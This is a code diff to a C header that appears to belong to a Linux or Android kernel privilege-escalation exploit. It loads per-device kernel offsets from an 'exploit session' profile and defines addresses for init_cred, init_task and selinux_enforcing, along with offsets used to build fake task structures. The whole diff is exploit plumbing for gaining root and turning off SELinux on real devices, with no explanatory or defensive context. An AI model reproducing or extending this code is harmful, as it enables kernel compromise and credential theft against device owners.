@@ -1,11 +1,14 @@
 #ifndef RUNTIME_STRUCT_OFFSETS_H
 #define RUNTIME_STRUCT_OFFSETS_H
 
-#include "../kernels/offsets.h"
+#include "profile.h"
 
-extern const struct kernel_offsets *active_offsets;
-
-#define _RSO(field, fallback) (active_offsets && active_offsets->field ? active_offsets->field : (fallback))
+#define _RSO(field, fallback)                                                \
+  target_profile_u32(&g_exploit_session.profile,                                     \
+                     target_profile_values(&g_exploit_session.profile)               \
+                         ? (uint32_t) target_profile_values(&g_exploit_session.profile)->field \
+                         : 0,                                                \
+                     (uint32_t) (fallback))
 #define _RSO_64(field, fallback) ((uint64_t)_RSO(field, fallback))
 #define _RSO_IMAGE(field, fallback) \
   (KIMAGE_TEXT_BASE + _RSO_64(field, fallback))
@@ -13,6 +16,7 @@ extern const struct kernel_offsets *active_offsets;
 /* Override symbol macros with the selected device entry. */
 #undef INIT_TASK
 #undef INIT_CRED
+#undef EMPTY_ZERO_PAGE
 #undef ROOT_TASK_GROUP
 #undef SELINUX_ENFORCING
 #undef SELINUX_BLOB_SIZES
@@ -26,6 +30,7 @@ extern const struct kernel_offsets *active_offsets;
 
 #define INIT_TASK           _RSO_IMAGE(off_init_task, INIT_TASK_OFF)
 #define INIT_CRED           _RSO_IMAGE(off_init_cred, INIT_CRED_OFF)
+#define EMPTY_ZERO_PAGE     _RSO_IMAGE(off_empty_zero_page, 0)
 #define ROOT_TASK_GROUP     _RSO_IMAGE(off_root_task_group, ROOT_TASK_GROUP_OFF)
 #define SELINUX_ENFORCING   _RSO_IMAGE(off_selinux_enforcing, SELINUX_ENFORCING_OFF)
 #define SELINUX_BLOB_SIZES  _RSO_IMAGE(off_selinux_blob_sizes, SELINUX_BLOB_SIZES_OFF)
@@ -50,7 +55,6 @@ extern const struct kernel_offsets *active_offsets;
 #undef FAKE_TASK_PI_WAITERS_OFF
 #undef FAKE_TASK_PI_TOP_TASK_OFF
 #undef FAKE_TASK_PI_BLOCKED_ON_OFF
-#undef FAKE_TASK_USAGE_OFF
 #undef TASK_PID_OFF
 #undef TASK_TGID_OFF
 #undef TASK_ATOMIC_FLAGS_OFF
@@ -67,7 +71,6 @@ extern const struct kernel_offsets *active_offsets;
 #define FAKE_TASK_PI_WAITERS_OFF     _RSO(task_pi_waiters, 0xA00)
 #define FAKE_TASK_PI_TOP_TASK_OFF    _RSO(task_pi_top_task, 0xA10)
 #define FAKE_TASK_PI_BLOCKED_ON_OFF  _RSO(task_pi_blocked_on, 0xA18)
-#define FAKE_TASK_USAGE_OFF          _RSO(task_usage, 0x40)
 #define TASK_PID_OFF             _RSO(task_pid, 0x708)
 #define TASK_TGID_OFF            _RSO(task_tgid, 0x70C)
 #define TASK_ATOMIC_FLAGS_OFF    _RSO(task_atomic_flags, 0x6C8)
